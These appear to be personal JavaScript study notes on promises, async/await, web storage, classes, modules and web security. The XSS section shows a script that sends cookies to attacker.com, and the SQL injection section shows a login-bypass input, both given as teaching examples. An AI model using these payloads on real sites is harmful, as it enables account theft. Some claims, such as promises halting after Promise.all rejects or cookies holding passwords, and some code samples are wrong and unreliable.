Wherever you want to manage asynchronous operations you can use promises there. For example you can use promises in API calls, File handling, Data fetching, Animations and visual effects, Event handling.
Promises are useful when you need to perform time taking operations in asynchronous manner and later handle the results when the result is available.
As the name suggest promise will not give you data or results immediately but it promises you to give the result after some time definitely.

Promise.all() is used to handle multiple promises concurrently. It takes an array of promises as input parameter and returns a single promise. It waits for all promises to resolve or at least one promise to reject. If any promise rejected then catch block will be triggered immediately & the remaining promises will not be executed.

Promise.race() is used to handle multiple promises concurrently. It takes an array of promises as input parameter and returns a single promise. Promise.race() waits for only one promise to resolve or reject. If first promise is resolved or rejected it will executed then or catch block & the remaining promises will not be executed.

Promise.all() Vs Promise.race() :
1.Promise.all() is used when you want to wait for all the input promises to settle. 
2.The returned promise resolves with an array of resolved values from the input promises, in the same order as the input promises.
1.Promise.race() is used when you want to react as soon as the first promise settles. 
2.The settled value (fulfilled value or rejection reason) of the first settled promise is used as the settled value of the returned promise.

sakshi.120924
#### ASYNC-AWAIT :
Async await internally uses promise constructor & resolve reject function of promises. They do not use then & catch functions which are used to handle the results of the promise, instead they use try-catch block for handling the results.
    function fetchData() {
        return new Promise((resolve, reject) => {
        setTimeout(() => {
                resolve('Data has been fetched ...')
            }, 1000)
        })
    }
We have function fetchData(), which returns a promise after getting the data & then we are using the asynchronous operation setTimeout() to resolve the data. Now to handle the result of this promise we can either use then-catch blocks or try-catch block.
1.Promise way :
    fetchData().then((result) => {
        console.log(result);
    }).catch((error) => {
        console.error(error);
    })
first we call the function fetchData() then we use then & catch function of the promises to handle the results from the resolve & reject functions.
2.async-await way :
    async function doSomethingAsync() {
    try {
        const result = await fetchData();
        console.log(result);
    } catch (error) {
        console.error(error);
        }
    }
    doSomethingAsync()
First, we create an async function with a name. Inside the function, a try-catch block is used to handle results. The code within this async function runs asynchronously and does not block other operations.
Within the try block, the await keyword is used with the fetchData() function. The await keyword completely pauses the execution of the function fetchData() until the Promise inside it is either resolved or rejected. If the Promise resolves, await returns the resolved value. If the Promise is rejected, an error is thrown, which is then caught by the catch block.
IMP : The await keyword completely pauses the execution of the fetchData() function. Any code, whether synchronous or asynchronous, that comes after the await will not execute until the asynchronous operation is completed. 
Keypoints : 1.Async await uses promise constructor & resolve reject functions 
            2.To handle the promise using async await 
                1. first we create a function which returns a promise & inside that promise we write asynchronous operation
                1. then we create async function with any name 
                2. we use try catch block inside it
                3. in try block we use await which completely pause the execution of function that returns a promise until promise is resolved or rejected
                4.if promise resolved await returns the resolved value if promise is rejected error is thrown & caught by catch block 
IMP : we must write only asynchronous operation inside the promise constructor while creating promise. 
Similarities and differences between promises and async-await :
1.Promises and async/await used to achieve the same goal ofhandling asynchronous operations.
2.async/await provides a more concise and readable syntax that resembles synchronous code whereas Promises use a chaining syntax with then() and catch() which is not that readable.
3.async/await still relies on Promises for handling the asynchronous nature of the code.

async & await uses :
The async keyword is used to define a function as an asynchronous function, which means the code inside async function will not block the execution other code.
The await keyword is used within an async function to pause the execution of the function until a Promise is resolved or rejected.
    function delay(ms) {
        return new Promise((resolve) => {
        setTimeout(() => {
            console.log('Running...');
            resolve();
        }, ms)
        })
    }
    async function greet() {
        console.log('Starting...'); // 1
        delay(2000); // non blocking // 5 
        console.log('Not blocked...'); // 2
        await delay(1000); // 3
        console.log('Blocked...'); // 4  
        }
    greet();
When we call a promise-based function, it does not block the execution of subsequent code. However, if we call the promise-based function with await, it will pause the execution of the function until the promise is either resolved or rejected.
'Not blocked...' will be executed immediately because it is associated with an asynchronous operation, which does not block the execution of subsequent code. However, 'Blocked...' will not be executed immediately, as await is used before it, causing the execution to pause until the promise is resolved or rejected.

When you want to pause the execution of an async function and wait for the completion of an asynchronous operation, you use await. This ensures that the code behaves in a synchronous manner at that specific point, even though the function itself is asynchronous. After the promise is resolved or rejected, the execution continues with the next line of code.

In simpler terms, await allows you to control the flow of execution inside an async function and ensures that subsequent code only runs after the asynchronous operation completes.

We can use async keyword without using await keyword but can not use await keyword without async keyword.
If you don't use await, the asynchronous operation will run concurrently, meaning the function will not wait for the operation to finish before continuing with the next line of code. This can lead to unexpected behavior because the function might proceed while the asynchronous task is still running.

In async/await functions, errors can be handled using try/catch blocks. If any operation in the try block fails, the error is caught in the catch block.

#### Browser APIs & Web Storage
Whenever we open a window in the browser, we basically invoke window object. It has the top-most position in the browser above the BOM, DOM & JavaScript.
    The Window object represents a window in browser.
    Window object serves as the entry point for interacting with the browser.
    It is not the object of javascript.

Each browser provide us some in-built functionalities thoese functionalities are called as browser APIs. We can interact with various features of browser & perform tasks using browser APIs.
Browser APIs (Application Programming Interfaces) in JavaScript are a collection of built-in interfaces and methods provided by web browsers. 
Browser APIs :
DOM API: Enables interaction and manipulation of the Document Object Model, which represents the structure of a web page.
XMLHttpRequest (XHR): Allows sending HTTP requests and receiving responses for interacting with servers asynchronously.
Fetch API: A modern interface for making HTTP requests and handling responses using promises.
Storage API: Provides mechanisms like localStorage and sessionStorage for storing data in the browser.
History API: Allows manipulation of the browser's session history (e.g., navigating back, forward, or modifying history entries).
Geolocation API: Enables access to the user's geographical location with their consent.
Notifications API: Allows displaying system-level notifications to the user from the browser.
Canvas API: Provides a way to draw and manipulate graphics, shapes, and images on a web page.
Audio and Video APIs: Facilitate the embedding and control of audio and video content on web pages.

Web Storage :
The Web Storage is used to store data locally within the browser.We have two types of web storage local storage & session storage. In devoper tools under application tab we found both of these.
5 uses of web storage :
    1.Storing user preferences or settings. for example : theme selection(dark/ light), language preference etc. 
    2.Web storage can be used for Caching some data to improve performance. 
    3.Remembering User Actions and State.If there are frequent user actions on web page then we storage is used to remember those actions. 
    4.Implementing Offline Functionality. For e.g internet goes off during filling long online form, we can use web storage to store the data filled by user.
    5.Storing Client-Side Tokens. like JWT token or cookies

Local storage :
LocalStorage is a web storage feature provided by web browsers that allows web applications to store key-value pairs of data locally on the user's device.
To store data in key-value pairs in local storage : we use localStorage api which has method setItem() 
    localStorage.setItem('key', 'value');
We can check this key-value pair in Application tab of developer tools.
To retrive the value of the key from localStorage : we use getItem('key') method, pass the key in it
    const value = localStorage.getItem('key');
To remove single item from localStorage : use removeItem('key') method & pass the key in it  
    localStorage.removeItem('key');
To remove all the localStorage items : use clear() method
    localStorage.clear();

Uses of local storage: 
1.Storing user preferences like language preference, theme preference. 
2.Caching data to improve performance. 
3.Implementing Offline Functionality. 
4.Storing Client-Side Tokens.
In 80% of cases we use localStorage for web storage, it is preferred type. Only very few times we use session storage.

Session Storage :
SessionStorage is a web storage feature provided by web browsers that allows web applications to store key-value pairs of data locally on the user's device. It is used to store data that is temporarily required.
SessionStorage has same methods like localStorage :
    setItem : to store key-value pair in sessiom storage
    getItem : to get the value of item stored in session storage
    removeItem: to remove item from sesssion storage 
    clear : to remove all the items from the session storage 
Uses of session storage: 
1.Storing Form Data. 
2.Storing Temporary Data. 
3.Maintaining shopping cart list. 
4.Implementing Step-by-Step Processes.

Local storage Vs Session storage :
1.
Local Storage is good for storing non-sensitive, long-term data that needs to persist across browsing sessions, even when the browser is closed and reopened. Never store sensitive data like user password in local storage, use http-only cookie for it.
It is commonly used for : 
    1.storing user preferences, such as themes, language settings, or layout choices to enhance user experience.
    2.to maintain application state, like sidebar collapse preferences or selected filters
    3.to cache static data like product lists or configurations fetched from APIs, to minimize redundant calls and improve performance
    4.to tracking progress data such as game scores, quiz completion, or draft content in editors
Session Storage is well-suited for storing temporary, non-sensitive data that is only needed for the duration of a browsing session.
It is commonly used for storing form inputs, cart items, or navigation states that enhance the user experience within a single tab or window.
2.
Data stored in Local Storage is accessible across multiple windows, tabs, and iframes of the same origin (domain).
Data stored in Session Storage is specific to a particular browsing session and is accessible only within the same window or tab.Session Storage is scoped to the specific window or tab in which it was created. Data stored in Session Storage is not shared across different tabs or windows, even if they are from the same origin (domain). The data remains accessible only while the specific tab or window is open and is cleared as soon as the tab or window is closed.
3.
Data stored in Local Storage persists even when the browser is closed and reopened.
Data stored in Session Storage is cleared when the browser window or tab is closed.
4.
Data stored in Local Storage has no expiration date unless explicitly removed by the user or application.
Data stored in Session Storage is temporary and lasts only for the duration of the browsing session.

Both Local Storage and Session Storage generally have a storage limit of 5MB per origin (domain) in most modern browsers.

Cookies :
Cookies are small pieces of data that are stored in the user's web browser.
To create cookie :
    document.cookie = 'cookieName1=cookieValue1';
    document.cookie = 'cookieName2=cookieValue2';
To retrive cookie :
    const cookieValue = getCookie('cookieName1');
    console.log(cookieValue);
function to retrieve a specific cookie value by its name :
    function getCookie(cookieName) {
    const cookies = document.cookie.split('; ');
    for (const cookie of cookies) {
        const [name, value] = cookie.split('=');
        if (name === cookieName) {
            return value;
            }
        }
        return "";
    }

Cookies Vs Web storage :
Cookies :
    1.Cookies have a small storage capacity of up to 4KB per domain. 
    2.Cookies are automatically sent with every request.
    3.Cookies can have an expiration date set. 
    4.Cookies are accessible both on the client-side (via JavaScript) and server-side (via HTTP headers). This allows server-side code to read and modify cookie values.
Web storage :
    1.Web storage have a large storage capacity of up to 5-1OMB per domain. 
    2.Data stored in web storage is not automatically sent with each request. 
    3.Data stored in web storage is not associated with an expiration date. 
    4.Web Storage is accessible and modifiable only on the client-side.

Cookies are primarily used to store sensitive data, such as user passwords or tokens, and are commonly accessed on the server side. They are also useful for cross-domain data sharing. On the other hand, web storage is ideal for storing larger amounts of data when persistence is needed on the client side.

#### Classes, Constructors, this & Inheritance
// IMP : MUST CHECK promise.js for other class concepts
The primary purpose of a class is to serve as a blueprint, design, or prototype for creating objects. The advantage of this pattern is reusability, which allows us to create multiple objects from the same class.
In ES6 we have a class keyword to create a class whereas in ES5 we have constructor function to create the class.
Classes serve as blueprints for creating objects and define their structure and behavior. Basically we create a class & from that class we can create multiple objects.
Advantages of classes:
1.Object Creation : through classes we can easily create and manage multiple instances of objects
2.Encapsulation : Classes bundle data (properties) and methods (functions) together controlling access and protecting data through private and public members.
3.Inheritance : Classes allow new classes to inherit properties and methods from existing ones, enabling shared behavior and reducing code duplication.
4.Code Reusability : Once defined, classes can be reused to create objects in different parts of an application without rewriting code.
5.Polymorphism : Classes allow objects to be treated as instances of their parent class, enabling methods to behave differently based on the object's class. It basically allows methods to have the same name but behave differently depending on which class or object is calling them. For example, we have the speak method in the Animal class, and we have created the Dog class from the Animal class. The Dog class can override the speak method to provide its own specific behavior, while still having the same method name.
6.Abstraction : Classes enable hiding complex implementation details and exposing only necessary functionality, making the code easier to use and maintain.For example, we have a Car class that has a startEngine() method. The user interacts with the startEngine() method without needing to understand how the engine works internally. This way, we abstract away the details of how the engine operates from the user.

Constructor function :
Constructors are special methods within classes that are automatically invoked when an object is instantiated using the new keyword.Constructor functions are a way to create objects and initialize their properties.
The constructor function is used to define and initialize the properties of an object when it is created.
We can define methods inside a constructor function but it's generally not recommended coz it is not memory-efficient. The best practise is to define methods outside the constructor function in a class or to define methods on the prototype, so all instances of the class share the same method, which is more memory-efficient.

If you are using ES6 classes we can define methods directly inside the class but outside the constructor function. In ES5 or older versions we define methods on the prototype for sharing.
ES6 :
class Person {
  constructor(name, age){
    this.name = name;
    this.age = age;
  }
  // method
  sayHello() {
    console.log(`${this.name} - ${this.age}`);
  }
}
ES5 :
function Person (name, age){
  this.name = name;
  this.age = age;
}
Person.prototype.sayHello = function(){
  console.log(`${this.name} - ${this.age}`);
}

IMP : do not define methods inside the constructor function

this keyword : this keyword provides a way to access the current object or class.
this.name refers to the property of the person class

Prototypal inheritance allows child objects to inherit properties and methods from parent objects.In JavaScript, every object has a prototype, and it can inherit properties and methods from that prototype

Inheritance or Sub-classing :
1. Inheritance or Sub-classing in OOP:
Concept: Inheritance, or subclassing, is a fundamental concept in Object-Oriented Programming (OOP). It allows one class (child class) to inherit properties and methods from another class (parent class).
Use Case: Inheritance is useful when there are shared or common behaviors between classes, but the child class may also have unique properties and methods.
2. Using extends Keyword (ES6):
Inheritance in ES6: The extends keyword is used in ES6 to inherit a class. It allows a child class to inherit all properties and methods from the parent class.
3. Child Class Inherits from Parent Class:
Inherited Properties and Methods: The child class can access properties and methods from the parent class.
Additional Properties and Methods: The child class can also have its own unique properties and methods that are not available in the parent class.
4. Example with Built-in JavaScript Classes:
Example of String Class: If you create a child class from JavaScript’s built-in String class, it automatically inherits all the methods from String, like toLowerCase(), toUpperCase(), and others.
5. Parent Class Members in Child Class:
Availability of Parent Members: All members (properties and methods) defined in the parent class are accessible in the child class and instances created from the child class.
6. Passing Parameters to Parent Constructor:
Parameter Passing: The child class can pass parameters to the parent class constructor by forwarding arguments through its own constructor using the super() keyword.
7. Child Class Constructor and super() Keyword:
Child Constructor Requires super(): If the child class has a constructor, it must call the parent class constructor first using the super() keyword. This ensures proper initialization of the parent class before initializing properties or methods specific to the child class.
Error Handling: If the child class constructor doesn't call super(), JavaScript throws a ReferenceError with the message: "must call super constructor". This happens because the parent class is not properly initialized.
8. Order of Initialization (Parent First, Then Child):
Why super() is Needed First: The parent class is responsible for initializing certain properties or methods that the child class depends on. Without initializing the parent class, the properties and methods of the parent class wouldn't be available for the child class to use.
Effect of Missing super(): Without super(), the child class cannot properly initialize its own properties and methods because it hasn't yet initialized the parent class.
9. Passing Parameters to Both Parent and Child Constructors:
Passing to Parent via super(): After calling super(), you can pass parameters to both the child and parent class constructors. The child constructor receives its own parameters, and super() forwards necessary parameters to the parent constructor.
10. Calling Parent Method in Child Class:
Accessing Parent Method: To call a parent class method from the child class, you must use the super keyword.
super for Method Access: The super() keyword can also be used to invoke a method from the parent class if the child class overrides the same method (method overriding).
11. Method Overriding:
Overriding in Child Class: If both the parent and child class define methods with the same name, the method in the child class will be invoked when called on an instance of the child class.
Calling Parent Method Inside Child Method: To invoke the parent class method inside the child class method, you use super.<methodName>().
class Parent {
  greet() {
    console.log('Hello from Parent');
  }
}
class Child extends Parent {
  greet() {
    console.log('Hello from Child');
    super.greet();  // Calling parent method
  }
}
const obj = new Child();
obj.greet();  // Calls both child and parent methods
// output :
// Hello from Child
// Hello from Parent
12. Role of super() in Both Constructor and Methods:
For Constructor: The super() keyword initializes the parent class constructor.
For Methods: The super keyword is used to call methods from the parent class when needed in the child class, such as in the case of method overriding.
Summary:
    Inheritance allows a child class to inherit properties and methods from a parent class.
    The super() keyword is crucial for calling the parent constructor and accessing parent methods.
    Child class methods can override parent class methods, and the super keyword is used to call the parent method in case of overriding.
    The parent class must be properly initialized with super() before the child class constructor can run.

Destructuring object literal :
// Check promise.js
Destructuring is the concept of breaking data structure like array or object literal into data pieces or in other words individual variables.

Getters & Setters :
    Accessors, also known as getter and setter methods, provide an approach to create a property in a class. 
    The `get` and `set` keywords are used to define methods that act as properties. 
    The getter method is executed when you read or get the value, 
    while the setter method is executed when you assign a value to that property.
// Check promise.js

#### ECMAScript & Modules
ECMAScript(ES6) is the standard which JavaScript follows. You can think of ECMAScript as a organiza
ES6 features :
    let and const
    Arrow Functions
    Classes
    Template Literals
    Destructuring Assignment
    Default Parameters
    Rest and Spread Operators
    Promises
    Modules

Modules in JS are a way to organize code into separate files, making it easier to manage and reuse code across different parts of an application.
Rather than writing whole javascript code in one single file like main.js or index.js, breaking the code on the basis of functionalities & creating multiple javascript files & importing them into the main file. Which makes the application code more structured & readable.
export keyword allows you to specify functions for use in other external modules.
Advantages of modules :
1.Reusability : Modules allow code to be reused across different parts of the application or even in other projects.
2.Code Organization : Modules help organize code into smaller, manageable files, improving clarity and structure.
3.Improved Maintainability : With modules, code can be updated or fixed in isolated parts without affecting the entire application.
4.Performance Optimization via lazy loading :Modules can be loaded on-demand, reducing initial load times and improving performance.
5.Encapsulation via independent and self-contained unit : Modules encapsulate functionality, keeping related code and variables within their scope and preventing conflicts.

Named exports Vs Default exports :
Named exports allow you to export multiple elements from a module while Default export allows you to export a single
element as the default export from a module.
For example :
1.Named export :
math.js
    export const add = (a, b) => a + b;
    export const subtract = (a, b) => a + b;
main.js
    import { add, subtract } from './math.js';
2.Default export :
utility.js
    export default function greet(name) {
        console.log(`Hello ${name}`);
    }
main.js
    import greet from "utility.js"

In index.html :
    <script type = 'module' src = 'index.js'></script>
Here type = 'module' specifies that the script is a JavaScript module.
It has features like :
    Supports import and export.
    Runs in strict mode.
    Executes asynchronously (deferred by default).
The default type is type="text/javascript" which specifies that the script is a JavaScript file.
    <script type = "text/javascript" src = 'index.js'></script>
For example :
index.html :
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Document</title>
</head>
<body>
  <script type="module" src="index.js"></script>
</body>
</html>
index.js :
import { add } from "./add.js";
import { add } from "./subtract.js";
console.log(add(2,3));
console.log(subtract(7,3));
add.js :
export function add(a, b){
    return a + b;
}
subtract.js :
export function subtract(a, b){
    return a - b;
}

Static import Vs Dynamic import : Dynamic are better
Static import :
    Syntax : import { something } from './module.js';
    Code is loaded at compile time (before execution begins).
    Blocking execution of code(before the script runs)
    Used for importing modules needed immediately and globally.
    Errors are caught at the module resolution phase.
    Supported in ES6-compliant browsers.
Dynamic import :
    Syntax : import('./module.js').then(module => { ... }).catch(error => { ... });
    Code is loaded at runtime (when the import() statement is executed).
    Non-blocking execution of code (asynchronous and returns a promise).
    Used for conditionally or lazily importing modules based on runtime logic.
    Improves performance by loading modules only when necessary.
    Errors can be caught using .catch() or try-catch.
    Supported in modern browsers and Node.js.

Module bundler : Module bundlers in JavaScript are tools that combine multiple modules or files into a single optimized bundle that can be executed by a web browser.
Some popular module bundlers are : Webpack, Rollup, Parcel, Browserify, RequireJS

#### Security & Performance
eval() is a built-in function that evaluates a string as a JavaScript code and dynamically executes it.
    Syntax : eval(String);
    Example : 
        1.
        const expression = "2 + 2";
        console.log(eval(expression)); // Output: 4
        2.
        const jsonString = '{"name": "Alice", "age": 25}';
        const obj = eval("(" + jsonString + ")");
        console.log(obj.name); // Output: Alice
Using eval() can lead to security vulnerabilities and performance issues. For example if string passed to eval function is user-provided, user might execute malicious code. Also eval() bypasses code optimization in the JavaScript engine which can lead to performance issue.
Instead of eval() we can use JSON.parse() for parsing JSON strings

XSS : XSS (Cross-Site Scripting) is a security attack when a user/ hacker insert some malicious script code in input fields to steal or manipulate content or website behavior.
For example we have input element & submit button on web page, then hacker may put malicious script & press the submit button which can change the behavior of the execution & might give the hacker all sensitive details like cookies to the hacker.
// Malicious script to steal cookie
<script>
	console.log("XSS attackl");
	var img = new Image();
    img.src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>
Types of XSS :
1.Stored XSS: The malicious script is stored on the server and delivered to other users (e.g., in a database).
2.Reflected XSS: The malicious script is embedded in a URL and executed when the victim clicks the link.
3.DOM-based XSS: The malicious script manipulates the website’s DOM directly without server interaction.
Prevention Techniques:
1.Input Validation and Sanitization: Validate and sanitize all user inputs using libraries like dompurify. Escape special characters like <, >, and &.
2.Use helmet for CSP (Content Security Policy): It is security middleware for Express.js applications. It helps secure your web application by setting various HTTP headers that protect against common security vulnerabilities, including XSS attacks, clickjacking, and other malicious activities
    npm install helmet
    app.use(
    helmet.contentSecurityPolicy({
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "https://trustedscripts.com"],
        },
     })
    );
    contentSecurityPolicy : sets the Content-Security-Policy header in HTTP responses
    directives : object defines specific content types (like scripts, images, etc.) and the allowed sources for those types.
    defaultSrc : specifies the default policy for content sources.
    self' means that all resources must come from the same origin as the current page (the same domain, protocol, and port).In other words, only resources hosted on your server (same domain) will be allowed to load by default.
2.Content Security Policy (CSP): Implement a CSP header to restrict the execution of scripts from untrusted sources.
3.HTTP-Only Cookies: Mark cookies as HttpOnly and Secure to prevent JavaScript access and ensure transmission over HTTPS.
4.Use Frameworks with Built-in Protection: Use templating engines (e.g., Pug, EJS) or frameworks (e.g., Angular, React) that automatically escape data.
5.Avoid eval(): Never use eval() to process user inputs.

SQL Injection attack : SQL Injection is a security attack when a user/ hacker insert some malicious SQL script code in input fields to steal or manipulate content.
For example : Consider a login form where users input their username and password:
    SELECT * FROM users WHERE username = '[username]' AND password = '[password]';
An attacker might input the following into the username field:
    ' OR '1' = '1
This would result in the following SQL query:
    SELECT * FROM users WHERE username = '' OR '1' = '1' AND password = '';
This query is always true ('1' = '1'), meaning the attacker might be able to bypass authentication and gain unauthorized access.
Prevention Techniques :
1.Use Parameterized Queries : ensure that user inputs are treated as data, not executable code
Example :
    const sql = "SELECT * FROM users WHERE username = ? AND password = ?";
    connection.query(sql, [username, password], (err, results) => {
    if (err) throw err;
    // Process results
    });
2.Use ORM's like Sequelize for MySQL or Mongoose for mongodb or query builders like Knex helps abstract away direct SQL queries, reducing the risk of SQL injection.
3.Input Validation and Sanitization: Validate user inputs to ensure that only expected types of data are submitted. Use whitelisting instead of blacklisting.Sanitize inputs to remove dangerous characters like ', --, and ;.
4.Least Privilege Principle: Ensure that the database user has the least amount of privilege necessary
5.Use Web Application Firewalls (WAF): Use a WAF to detect and block malicious SQL injection attempts.

Best practices for implementing security in JS:
1.Input Validation: Always validate and sanitize user input to prevent XSS (Cross-Site Scripting) and SQL injection attacks.
2.Avoid Eval: Avoid using eval() to execute dynamic code as it can introduce security risks by executing untrusted code.
3.Secure Communication: Always use HTTPS not HTTP for secure communication.
4.Authentication and Authorization: Use strong password hashing algorithms.

Best practices for improving performance in JS :
1.Minimize HTTP Requests: Combine and minify JavaScriptfiles into a single file to reduce the number of HTTPrequests. For eg: use module bundlers.
2.Use Asynchronous Operations: Utilize callbacks,promises, or async/await to perform asynchronousoperations and avoid blocking the main thread.
3.Minimize DOM Manipulation
4.Avoid Memory Leaks: Remove event listener whenevents are no more required.
5.Cache Data: Store frequently used data in memory orbrowser storage.
6.Lazy Loading: Use lazy loading techniques to loadresources only when they are needed, improving initialpage load time.
7.Optimize Images
